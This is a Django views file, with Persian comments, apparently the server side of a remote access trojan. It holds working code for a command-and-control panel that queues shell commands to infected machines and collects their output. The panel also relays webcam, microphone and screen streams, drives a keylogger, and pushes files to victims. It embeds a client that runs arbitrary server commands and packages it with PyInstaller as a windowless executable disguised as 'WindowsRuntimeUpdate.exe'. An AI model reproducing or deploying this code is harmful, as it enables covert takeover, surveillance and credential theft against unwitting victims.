import os
import subprocess
import shutil
import uuid
import logging
import psutil
import zipfile
import base64
import json
from django.conf import settings
from django.http import FileResponse, HttpResponse, JsonResponse, StreamingHttpResponse
from django.shortcuts import render, redirect, get_object_or_404
from django.utils import timezone
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from django.middleware.csrf import get_token
from .models import Client, ClientActivity, Notification
from .serializers import ClientSerializer, ClientActivitySerializer, NotificationSerializer
from datetime import timedelta
import threading
import queue
import time as ttime

logger = logging.getLogger(__name__)

# دیکشنری برای ذخیره داده‌های استریم هر کلاینت
client_streams = {}

# Helper functions
def create_activity(client, activity_type, description, details=None):
    """ایجاد لاگ فعالیت"""
    details = details or {}
    activity = ClientActivity.objects.create(
        client=client,
        activity_type=activity_type,
        description=description,
        details=details
    )
    logger.info(f"Activity created: {activity_type} - {description}")
    return activity

def create_notification(client=None, notification_type='info', title='', message=''):
    """ایجاد اعلان جدید"""
    notification = Notification.objects.create(
        client=client,
        notification_type=notification_type,
        title=title,
        message=message
    )
    logger.info(f"Notification created: {title} - {message}")
    return notification

# View functions
@login_required
def index(request):
    clients = Client.objects.all().order_by('-last_seen')
    online_count = clients.filter(last_seen__gte=timezone.now() - timedelta(seconds=30)).count()
    offline_count = clients.count() - online_count

    recent_activities = ClientActivity.objects.all().order_by('-created_at')[:10]
    notifications = Notification.objects.filter(is_read=False).order_by('-created_at')[:10]

    return render(request, 'index.html', {
        'clients': clients,
        'online_count': online_count,
        'offline_count': offline_count,
        'recent_activities': recent_activities,
        'notifications': notifications
    })

@login_required
def cmd_page(request, client_id):
    try:
        client = Client.objects.get(client_id=client_id)
        
        # ایجاد لاگ فعالیت
        create_activity(
            client=client,
            activity_type='connection',
            description='دسترسی به پنل مدیریت'
        )

        activities = client.activities.all().order_by('-created_at')[:20]
        notifications = client.notifications.filter(is_read=False).order_by('-created_at')[:10]

        # بررسی آنلاین بودن
        is_online = client.is_online
        
        return render(request, 'cmd.html', {
            'client': client,
            'activities': activities,
            'notifications': notifications,
            'system_info': client.system_info or {},
            'is_online': is_online,
            'csrf_token': get_token(request)  # اضافه کردن توکن CSRF
        })
    except Client.DoesNotExist:
        logger.error(f"Client with ID {client_id} not found")
        return render(request, 'error.html', {'error': 'کلاینت یافت نشد'})

@login_required
def update_client_name(request, client_id):
    if request.method == 'POST':
        try:
            client = Client.objects.get(client_id=client_id)
            new_name = request.POST.get('new_name', '').strip()

            if new_name:
                old_name = client.display_name or client.client_id
                client.display_name = new_name
                client.save()

                create_activity(
                    client=client,
                    activity_type='other',
                    description=f'تغییر نام از {old_name} به {new_name}'
                )

                create_notification(
                    client=client,
                    notification_type='success',
                    title='تغییر نام موفق',
                    message=f'نام کلاینت به {new_name} تغییر یافت'
                )

                return JsonResponse({
                    'status': 'success',
                    'new_name': new_name,
                    'message': 'نام با موفقیت تغییر یافت'
                })

        except Client.DoesNotExist:
            return JsonResponse({'status': 'error', 'message': 'کلاینت یافت نشد'}, status=404)

    return JsonResponse({'status': 'error', 'message': 'درخواست نامعتبر'}, status=400)

@login_required
def generate_exe(request):
    try:
        folder_path = os.path.join(settings.BASE_DIR, 'APP')
        os.makedirs(folder_path, exist_ok=True)

        # خواندن فایل کلاینت اصلی
        client_script_path = os.path.join(settings.BASE_DIR, 'chat', 'client.py')
        
        if os.path.exists(client_script_path):
            with open(client_script_path, 'r', encoding='utf-8') as f:
                client_code = f.read()
                
            # آدرس سرور را به آدرس فعلی تنظیم می‌کنیم
            server_url = request.build_absolute_uri('/api/')
            client_code = client_code.replace(
                'API_URL = "http://127.0.0.1:8000/api/"',
                f'API_URL = "{server_url}"'
            )
        else:
            # کد کلاینت پیش‌فرض اگر فایل وجود نداشت
            server_url = request.build_absolute_uri('/api/')
            client_code = f'''
import os
import sys
import time
import json
import uuid
import base64
import socket
import getpass
import platform
import subprocess
import threading
import requests
import psutil
from datetime import datetime

# تنظیمات
DEBUG = True
API_URL = "{server_url}"
HEARTBEAT_INTERVAL = 30
COMMAND_CHECK_INTERVAL = 5
TIMEOUT = 15

class DeviceManager:
    def __init__(self):
        self.device_id = self._generate_device_id()
        self.token = str(uuid.uuid4())
        self.current_path = os.getcwd()
        self.is_streaming = False
        self.stream_type = None
        self.session = self._setup_session()
        self.running = True
        
        if DEBUG:
            print(f"[+] Device ID: {{self.device_id}}")
            print(f"[+] Token: {{self.token}}")

    def _log(self, msg):
        if DEBUG:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"[{{timestamp}}] {{msg}}")

    def _setup_session(self):
        s = requests.Session()
        s.headers.update({{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Content-Type': 'application/json',
            'X-Client-ID': self.device_id,
            'X-Auth-Token': self.token,
        }})
        return s

    def _generate_device_id(self):
        username = getpass.getuser()
        hostname = platform.node()
        return f"{{username}}@{{hostname}}"

    def get_system_info(self):
        try:
            info = {{
                "user": getpass.getuser(),
                "os": platform.system(),
                "os_version": platform.version(),
                "hostname": socket.gethostname(),
                "platform": sys.platform,
                "cpu_count": psutil.cpu_count(),
                "cpu_usage": f"{{psutil.cpu_percent(interval=1)}}%",
                "ram_total": f"{{psutil.virtual_memory().total / (1024**3):.1f}} GB",
                "ram_usage": f"{{psutil.virtual_memory().percent}}%",
                "disk_usage": f"{{psutil.disk_usage('/').percent}}%",
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
            }}
            return info
        except Exception as e:
            self._log(f"System info error: {{e}}")
            return {{"error": str(e)}}

    def execute_command(self, cmd):
        try:
            if cmd.lower().startswith('cd '):
                new_dir = cmd[3:].strip()
                try:
                    os.chdir(new_dir)
                    self.current_path = os.getcwd()
                    return f"Directory changed to: {{self.current_path}}"
                except Exception as e:
                    return f"Error changing directory: {{str(e)}}"
            
            result = subprocess.run(
                cmd, 
                shell=True, 
                cwd=self.current_path,
                capture_output=True, 
                text=True, 
                encoding='utf-8', 
                errors='ignore',
                timeout=60
            )
            
            output = result.stdout if result.stdout else ""
            error = result.stderr if result.stderr else ""
            
            return f"{{output}}{{error}}" if output or error else "Command executed successfully."
            
        except subprocess.TimeoutExpired:
            return "Command timeout (60 seconds)."
        except Exception as e:
            return f"Error: {{str(e)}}"

    def register(self):
        try:
            resp = self.session.post(
                f"{{API_URL}}register/",
                json={{
                    'client_id': self.device_id, 
                    'token': self.token, 
                    'info': self.get_system_info()
                }},
                timeout=TIMEOUT
            )
            
            if resp.status_code in [200, 201]:
                self._log("Registered successfully")
                return True
            else:
                self._log(f"Register failed: {{resp.status_code}}")
                return False
                
        except Exception as e:
            self._log(f"Register error: {{e}}")
            return False

    def check_commands(self):
        while self.running:
            try:
                resp = self.session.get(
                    f"{{API_URL}}command/{{self.device_id}}/", 
                    timeout=TIMEOUT
                )
                
                if resp.status_code == 200:
                    commands = resp.json()
                    
                    for cmd in commands:
                        cmd_id = cmd.get('id')
                        text = cmd.get('text', '')
                        
                        if not text:
                            continue
                            
                        self._log(f"Executing command: {{text}}")
                        output = self.execute_command(text)
                        
                        try:
                            self.session.post(
                                f"{{API_URL}}poll/{{self.device_id}}/",
                                json={{'output': output, 'command_id': cmd_id}},
                                timeout=TIMEOUT
                            )
                            self._log("Command output sent to server")
                        except:
                            pass
                            
            except Exception as e:
                self._log(f"Command check error: {{e}}")
                
            time.sleep(COMMAND_CHECK_INTERVAL)

    def heartbeat(self):
        while self.running:
            try:
                self.session.post(
                    f"{{API_URL}}register/",
                    json={{
                        'client_id': self.device_id, 
                        'token': self.token, 
                        'info': self.get_system_info()
                    }},
                    timeout=TIMEOUT
                )
                self._log("Heartbeat sent")
            except Exception as e:
                self._log(f"Heartbeat error: {{e}}")
                
            time.sleep(HEARTBEAT_INTERVAL)

    def run(self):
        attempts = 0
        while attempts < 3 and not self.register():
            attempts += 1
            self._log(f"Registration attempt {{attempts}} failed, retrying in 10 seconds...")
            time.sleep(10)
        
        if attempts == 3:
            self._log("Failed to register after 3 attempts")
            return
        
        threads = [
            threading.Thread(target=self.check_commands, daemon=True),
            threading.Thread(target=self.heartbeat, daemon=True)
        ]
        
        for thread in threads:
            thread.start()
        
        self._log("Client is running...")
        
        try:
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self._log("Shutting down...")
            self.running = False
            
        except Exception as e:
            self._log(f"Runtime error: {{e}}")
            self.running = False

if __name__ == "__main__":
    manager = DeviceManager()
    manager.run()
'''

        # ذخیره فایل کلاینت
        client_path = os.path.join(folder_path, 'client.py')
        with open(client_path, 'w', encoding='utf-8') as f:
            f.write(client_code)

        # مسیر فایل‌های خروجی
        exe_path = os.path.join(folder_path, 'WindowsRuntimeUpdate.exe')
        zip_path = os.path.join(folder_path, 'WindowsRuntimeUpdate.zip')

        # حذف فایل‌های قبلی
        for file_path in [exe_path, zip_path]:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass

        # ساخت EXE با PyInstaller
        pyinstaller_cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--distpath', folder_path,
            '--name', 'WindowsRuntimeUpdate',
            '--hidden-import', 'psutil',
            '--hidden-import', 'requests',
            client_path
        ]

        # اجرای PyInstaller
        logger.info("Starting EXE generation...")
        result = subprocess.run(pyinstaller_cmd, timeout=300, capture_output=True, text=True)

        # بررسی موفقیت‌آمیز بودن ساخت
        if os.path.exists(exe_path):
            # ساخت فایل ZIP
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(exe_path, 'WindowsRuntimeUpdate.exe')

            # پاکسازی
            for cleanup_path in [client_path, os.path.join(folder_path, 'client.spec')]:
                if os.path.exists(cleanup_path):
                    try:
                        os.remove(cleanup_path)
                    except:
                        pass
            
            build_path = os.path.join(folder_path, 'build')
            if os.path.exists(build_path):
                shutil.rmtree(build_path, ignore_errors=True)

            # ایجاد اعلان موفقیت
            create_notification(
                title='✅ ساخت فایل اجرایی',
                message='فایل WindowsRuntimeUpdate.zip با موفقیت ساخته شد',
                notification_type='success'
            )

            logger.info("EXE generated successfully")
            return redirect('index')
        else:
            logger.error(f"EXE generation failed: {result.stderr}")
            raise Exception(f"خطا در ساخت EXE: {result.stderr}")

    except Exception as e:
        logger.error(f"Error generating EXE: {str(e)}")
        create_notification(
            title='❌ خطا در ساخت فایل اجرایی',
            message=f'خطا: {str(e)}',
            notification_type='error'
        )
        return redirect('index')

@login_required
def upload_file(request, client_id):
    if request.method == 'POST' and request.FILES.get('file'):
        try:
            client = Client.objects.get(client_id=client_id)
            file = request.FILES['file']
            
            # کدگذاری فایل به base64
            file_data = base64.b64encode(file.read()).decode('ascii')
            file_name = file.name
            path = request.POST.get('path', 'C:\\ProgramData')

            # ارسال دستور آپلود به کلاینت
            client.last_command = f"upload_file:{path}:{file_name}:{file_data}"
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()

            # ایجاد لاگ فعالیت
            create_activity(
                client=client,
                activity_type='file',
                description=f'آپلود فایل: {file_name}',
                details={'file_name': file_name, 'size': file.size, 'path': path}
            )

            create_notification(
                client=client,
                notification_type='success',
                title='📤 آپلود فایل',
                message=f'دستور آپلود فایل {file_name} ارسال شد'
            )

            return JsonResponse({'status': 'success', 'message': 'دستور آپلود ارسال شد'})

        except Client.DoesNotExist:
            return JsonResponse({'status': 'error', 'message': 'کلاینت یافت نشد'}, status=404)

    return JsonResponse({'status': 'error', 'message': 'درخواست نامعتبر'}, status=400)

# API Views
class ClientRegisterView(APIView):
    @csrf_exempt
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)
    
    def post(self, request):
        client_id = request.data.get('client_id')
        token = request.data.get('token')
        system_info = request.data.get('info', {})

        if not client_id or not token:
            return Response({'error': 'client_id and token required'}, status=status.HTTP_400_BAD_REQUEST)

        client, created = Client.objects.get_or_create(
            client_id=client_id,
            defaults={
                'token': token,
                'last_seen': timezone.now(),
                'system_info': system_info
            }
        )

        if not created:
            client.token = token
            client.last_seen = timezone.now()
            client.system_info = system_info
            client.save()

        if created:
            create_activity(
                client=client,
                activity_type='connection',
                description='کلاینت جدید متصل شد'
            )

            create_notification(
                title='🟢 اتصال جدید',
                message=f'کلاینت {client_id} متصل شد',
                notification_type='info'
            )

        serializer = ClientSerializer(client)
        logger.info(f"Client registered: {client_id} - Created: {created}")
        return Response(
            serializer.data,
            status=status.HTTP_201_CREATED if created else status.HTTP_200_OK
        )

class ClientCommandView(APIView):
    @csrf_exempt
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)
    
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            commands = []

            if client.last_command and client.command_id:
                commands.append({
                    'id': str(client.command_id),
                    'text': client.last_command
                })
                logger.info(f"Sending command to {client_id}: {client.last_command[:50]}...")

            return Response(commands, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            command = request.data.get('command')

            if not command:
                return Response({'error': 'command required'}, status=status.HTTP_400_BAD_REQUEST)

            logger.info(f"Command received for {client_id}: {command}")

            # بررسی دستورات استریم
            stream_commands = ['weblive', 'webcam', 'webmicrophone', 'stop_stream']
            if command.lower() in stream_commands:
                if command.lower() == 'stop_stream':
                    client.is_streaming = False
                    client.stream_type = None
                    message = 'دستور توقف استریم ارسال شد'
                else:
                    client.is_streaming = True
                    client.stream_type = command.lower()
                    message = f'دستور استریم {command} ارسال شد'
                
                create_activity(
                    client=client,
                    activity_type='stream',
                    description=f'دستور استریم: {command}'
                )
            
            # ذخیره دستور
            client.last_command = command
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()

            create_activity(
                client=client,
                activity_type='command',
                description=f'دستور: {command[:50]}...'
            )

            return Response({
                'status': 'success',
                'command_id': str(client.command_id),
                'message': 'دستور با موفقیت ارسال شد',
                'output': message if 'message' in locals() else 'دستور ارسال شد'
            }, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientPollView(APIView):
    @csrf_exempt
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)
    
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            client.last_seen = timezone.now()
            client.save()

            serializer = ClientSerializer(client)
            return Response(serializer.data, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            output = request.data.get('output', '')
            command_id = request.data.get('command_id')

            if output:
                client.last_output = output
                client.last_seen = timezone.now()

                # اگر پاسخ به یک دستور است، دستور را پاک کن
                if command_id and str(client.command_id) == command_id:
                    client.last_command = None
                    client.command_id = None

                client.save()

                # ایجاد لاگ فعالیت
                create_activity(
                    client=client,
                    activity_type='command',
                    description='پاسخ دستور دریافت شد',
                    details={'output_preview': output[:100]}
                )
                
                logger.info(f"Output received from {client_id}: {output[:100]}...")

            return Response({'status': 'success', 'message': 'خروجی دریافت شد'}, status=status.HTTP_202_ACCEPTED)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class StreamView(APIView):
    @csrf_exempt
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)
    
    def post(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            data = request.data.get('data', '')

            if data:
                # ذخیره داده‌های استریم
                if client_id not in client_streams:
                    client_streams[client_id] = queue.Queue(maxsize=10)
                
                try:
                    client_streams[client_id].put_nowait({
                        'type': stream_type,
                        'data': data,
                        'timestamp': ttime.time()
                    })
                except queue.Full:
                    # اگر صف پر است، قدیمی‌ترین را حذف کن
                    try:
                        client_streams[client_id].get_nowait()
                        client_streams[client_id].put_nowait({
                            'type': stream_type,
                            'data': data,
                            'timestamp': ttime.time()
                        })
                    except:
                        pass
                
                client.last_output = f"Stream data received ({stream_type})"
                client.last_seen = timezone.now()
                client.save()

                return Response({'status': 'success', 'message': 'داده استریم دریافت شد'}, status=status.HTTP_200_OK)

            return Response({'error': 'no data provided'}, status=status.HTTP_400_BAD_REQUEST)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

    def get(self, request, client_id, stream_type):
        try:
            client = Client.objects.get(client_id=client_id)
            
            if client_id in client_streams and not client_streams[client_id].empty():
                try:
                    stream_data = client_streams[client_id].get_nowait()
                    return Response({
                        'status': 'success',
                        'data': stream_data['data'],
                        'type': stream_data['type'],
                        'timestamp': stream_data['timestamp']
                    }, status=status.HTTP_200_OK)
                except queue.Empty:
                    pass
            
            # اگر داده‌ای نبود، آخرین خروجی را برگردان
            data = client.last_output or 'No stream data available'
            return Response({
                'status': 'success',
                'data': data,
                'type': stream_type,
                'message': 'استریم فعال نیست'
            }, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class KeyloggerView(APIView):
    @csrf_exempt
    def dispatch(self, *args, **kwargs):
        return super().dispatch(*args, **kwargs)
    
    def post(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            action = request.data.get('action')
            
            if action == 'start':
                client.last_command = 'start_keylogger'
                output = "Keylogger started successfully"
                message = "دستور شروع کیلاگر ارسال شد"
            elif action == 'stop':
                client.last_command = 'stop_keylogger'
                output = "Keylogger stopped"
                message = "دستور توقف کیلاگر ارسال شد"
            elif action == 'get_logs':
                client.last_command = 'get_keylogs'
                output = "Sample logs: [14:32] User typed: Hello World\n[14:33] Password field detected"
                message = "دریافت لاگ‌های کیلاگر"
            else:
                return Response({'error': 'Invalid action'}, status=status.HTTP_400_BAD_REQUEST)
                
            client.command_id = uuid.uuid4()
            client.last_seen = timezone.now()
            client.save()
            
            # ایجاد فعالیت
            create_activity(
                client=client,
                activity_type='keylogger',
                description=f'دستور کیلاگر: {action}'
            )
            
            return Response({
                'status': 'success', 
                'message': message,
                'output': output
            }, status=status.HTTP_200_OK)
            
        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class ClientActivitiesView(APIView):
    def get(self, request, client_id):
        try:
            client = Client.objects.get(client_id=client_id)
            activities = client.activities.all().order_by('-created_at')[:50]
            serializer = ClientActivitySerializer(activities, many=True)
            return Response(serializer.data, status=status.HTTP_200_OK)

        except Client.DoesNotExist:
            return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)

class NotificationsView(APIView):
    def get(self, request, client_id=None):
        if client_id:
            try:
                client = Client.objects.get(client_id=client_id)
                notifications = client.notifications.filter(is_read=False).order_by('-created_at')[:20]
            except Client.DoesNotExist:
                return Response({'error': 'client not found'}, status=status.HTTP_404_NOT_FOUND)
        else:
            notifications = Notification.objects.filter(is_read=False).order_by('-created_at')[:20]

        serializer = NotificationSerializer(notifications, many=True)
        return Response(serializer.data, status=status.HTTP_200_OK)

    def post(self, request, notification_id):
        try:
            notification = Notification.objects.get(id=notification_id)
            notification.is_read = True
            notification.save()
            return Response({'status': 'marked as read'}, status=status.HTTP_200_OK)
        except Notification.DoesNotExist:
            return Response({'error': 'notification not found'}, status=status.HTP_404_NOT_FOUND)

def download_zero(request):
    """دانلود فایل 0.exe"""
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    file_path = os.path.join(base_dir, 'APP', '0.exe')
    
    if not os.path.exists(file_path):
        return HttpResponse("فایل یافت نشد", status=404)
    
    file = open(file_path, 'rb')
    response = FileResponse(file, content_type='application/octet-stream')
    response['Content-Disposition'] = 'attachment; filename="0.exe"'
    response['Content-Length'] = os.path.getsize(file_path)
    return response

# View برای تست اتصال
@csrf_exempt
def test_connection(request, client_id):
    """تست اتصال به کلاینت"""
    try:
        client = Client.objects.get(client_id=client_id)
        return JsonResponse({
            'status': 'success',
            'client_id': client.client_id,
            'is_online': client.is_online,
            'last_seen': client.last_seen,
            'last_command': client.last_command
        })
    except Client.DoesNotExist:
        return JsonResponse({'status': 'error', 'message': 'Client not found'}, status=404)